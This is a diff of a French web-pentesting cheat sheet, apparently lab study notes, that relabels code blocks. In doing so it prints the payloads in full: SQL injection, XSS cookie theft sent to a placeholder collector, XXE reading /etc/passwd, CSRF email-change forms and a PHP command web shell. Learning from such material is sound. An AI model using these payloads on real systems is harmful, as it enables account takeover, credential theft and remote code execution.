@@ -39,11 +39,11 @@
 
 - Vérifier qu'une injection SQL est possible
 - Bypass la connexion avec un payload du type :
-```powershell
+```sql
 ' or 1=1--
 ```
 - Ou se connecter avec un utilisateur spécifique avec un payload du type :
-```powershell
+```sql
 username' --
 ```
 
@@ -51,16 +51,16 @@ username' --
 
 - Vérifier qu'une injection SQL est possible
 - Récupérer le nombre de colonnes retournées par la requête
-```powershell
+```sql
 ' order by X--
 ```
 - Déterminer quels champs peuvent afficher le texte
-```powershell
+```sql
 qzdqzdq' union select 'qdz',NULL,NULL--
 ```
 - Récupérer la liste des tables avec la cheetsheet portswigger
 - Ou récupérer directement une information d'une table connue ou standard (ex : users)
-```powershell
+```sql
 qzdqzdq' union select username,password,NULL from users--
 ```
 
@@ -69,7 +69,7 @@ qzdqzdq' union select username,password,NULL from users--
 - Faire une timebased SQL avec la cheetsheet portswigger ou la correction des labs :
 [Time based Lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
 [Time based avec récupération d'informations](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
-```powershell
+```sql
 '||pg_sleep(10)--
 ```
 
@@ -86,37 +86,37 @@ qzdqzdq' union select username,password,NULL from users--
 ### Méthodologie pour un contenu affiché (Si il n'est pas afficher partir de l'étape 4)
 
 - Vérifier que du XSS est possible
-```powershell
+```html
 a<b>Test</b>b
 ```
 - Chercher les caractères interdits
 - Essayer d'exécuter du script
-```powershell
+```html
 a<script>alert(0)</script>
 ```
-```powershell
+```html
 <a href="javascript:alert(1)">Test</a>
 ```
-```powershell
+```html
 <body onload=alert(1)>
 ```
-```powershell
+```html
 <img src=x onerror=alert(1)>
 ```
-```powershell
+```html
 <svg onload=alert(1)>
 ```
 - Si on peut faire exécuter le XSS chez un autre utilisateur on peut récupérer ses cookies :
-```powershell
+```html
 <script>document.location='BEECEPTOR/'+document.cookie</script>
 ```
-```powershell
+```html
 <img src=x onerror=this.src='BEECEPTOR/'+document.cookie;>
 ```
-```powershell
+```html
 <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
 ```
-```powershell
+```javascript
 localStorage.getItem('access_token')
 ```
 - On peut également faire du CSRF pour obliger l'utilisateur à réaliser une action déterminée
@@ -133,11 +133,11 @@ localStorage.getItem('access_token')
 ### Méthodologie pour afficher un fichier ou lire un lien
 
 - Rajouter au début
-```powershell
+```html
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 ```
 - Puis afficher le contenu avec
-```powershell
+```html
 &xxe;
 ```
 
@@ -154,7 +154,7 @@ localStorage.getItem('access_token')
 ### Méthodologie
 
 - En fonction de la requête à exploiter utiliser le payload qui correspond
-```powershell
+```html
 <form action="https://vulnerable-website.com/email/change" method="POST">
   <input type="hidden" name="email" value="pwned@evil-user.net" />
 </form>
@@ -162,7 +162,7 @@ localStorage.getItem('access_token')
   document.forms[0].submit();
 </script>
 ```
-```powershell
+```html
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
 
@@ -207,7 +207,7 @@ php://filter/convert.base64-encode/resource=index.php
 - Upload un fichier autorisé
 - Récupérer le chemin d'accès au fichier
 - Essayer de mettre un code php simple
-```powershell
+```php
 <?php echo 'test'; ?>
 ```
 - En cas d'erreur essayer de changer l'extension :
@@ -227,7 +227,7 @@ Content-Type : image/jpeg
 ```
 - En cas d'erreur essayer d'utiliser les Magic Bytes (cf: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files))
 - Finalement on effectue une [RCI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) pour récupérer ce que l'on veut :
-```powershell
+```php
 <?php echo system($_GET['command']); ?>
 ```
 
